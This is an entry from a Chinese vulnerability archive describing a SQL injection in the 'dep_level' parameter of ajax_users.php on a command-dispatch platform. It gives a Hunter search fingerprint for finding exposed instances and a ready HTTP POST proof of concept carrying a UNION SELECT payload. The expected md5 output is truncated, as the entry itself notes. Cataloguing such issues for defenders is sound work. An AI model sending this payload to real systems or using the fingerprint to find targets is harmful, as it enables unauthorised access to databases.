---
source: "wy876 漏洞文库"
title: "指挥调度平台PHP版（厂商待核） ajax_users dep_level SQL 注入"
product: "指挥调度平台PHP版（厂商待核）"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "版本未知，MySQL联合查询"
prerequisites: "未说明"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/qmfywxxk17pr7xs3"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E8%9E%8D%E5%90%88%E6%8C%87%E6%8C%A5%E8%B0%83%E5%BA%A6%E5%B9%B3%E5%8F%B0/%E6%8C%87%E6%8C%A5%E8%B0%83%E5%BA%A6%E5%B9%B3%E5%8F%B0ajax_users%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
fofa_unverified: "web.body="
hunter: "web.body=\"app/structure/departments.php\""
id: "vw-19e8eb9da19234ea5b3fb1bc"
entity_id: "ve-19e8eb9da19234ea5b3fb1bc"
schema_version: "1"
---

# 指挥调度平台PHP版（厂商待核） ajax_users dep_level SQL 注入

## 条目说明

- 对象与具体问题：指挥调度平台PHP版（厂商待核）；ajax_users dep_level SQLi
- 版本、配置及部署条件：版本未知，MySQL联合查询
- 认证与权限前提：未说明
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 预期md5(123456)哈希在文中截短，不能作为可靠匹配标记；无完整HTTP响应
- 同目录532Java平台不可直接视同一产品，需厂商/源码来源
- Hunter错入fofa；HTML残留，无补丁版本
- 后读536/540外部附件名含福建科立讯通信，提供厂商线索但未独立核验

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

## 一、漏洞简介
指挥调度管理平台是一个专业针对通信行业的管理平台。该产品旨在提供高效的指挥调度和管理解决方案，以帮助通信运营商或相关机构实现更好的运营效率和服务质量。该平台提供强大的指挥调度功能，可以实时监控和管理通信网络设备、维护人员和工作任务等。用户可以通过该平台发送指令、调度人员、分配任务。指挥调度平台ajax_users存在SQL注入漏洞，攻击者可通过该漏洞获取数据库敏感信息。

## 二、影响版本
+ 指挥调度平台

## 三、资产测绘
+ hunter`web.body="app/structure/departments.php"`
+ 特征


## 四、漏洞复现
```http
POST /app/ext/ajax_users.php HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Content-Type: application/x-www-form-urlencoded
 
dep_level=1') UNION ALL SELECT NULL,CONCAT(0x7e,md5(123456),0x7e),NULL,NULL,NULL-- -
```


```http
e10adc3949ba59abbe56e057f20f883
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/qmfywxxk17pr7xs3>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
